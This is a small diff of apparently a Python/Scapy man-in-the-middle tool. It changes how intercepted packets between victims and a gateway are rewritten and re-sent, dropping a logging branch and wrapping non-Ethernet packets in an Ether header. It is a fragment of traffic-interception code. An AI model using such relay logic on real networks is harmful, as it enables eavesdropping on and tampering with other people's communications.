@@ -73,13 +73,14 @@ def read_packets(attacker, victims, gateway, function, options, packet_function_
                     print(pkt.summary())  if options.verbose else 0
 
                     pkt = function(pkt, packet_function_args)
-                elif pkt[IP].src == victim.ip:
-                    print("[+] Packet found from " + victim.ip)  if options.verbose else 0
-                    print(pkt.summary())  if options.verbose else 0
 
 
-        if (pkt[Ether].dst == attacker.mac):
-            pkt[Ether].dst = mac
+
+        if pkt.haslayer(Ether):
+            if (pkt[Ether].dst == attacker.mac):
+                pkt[Ether].dst = mac
+        else:
+            pkt = Ether(dst=mac) / pkt
 
         sendp(pkt, iface=options.iface, verbose=False)
 
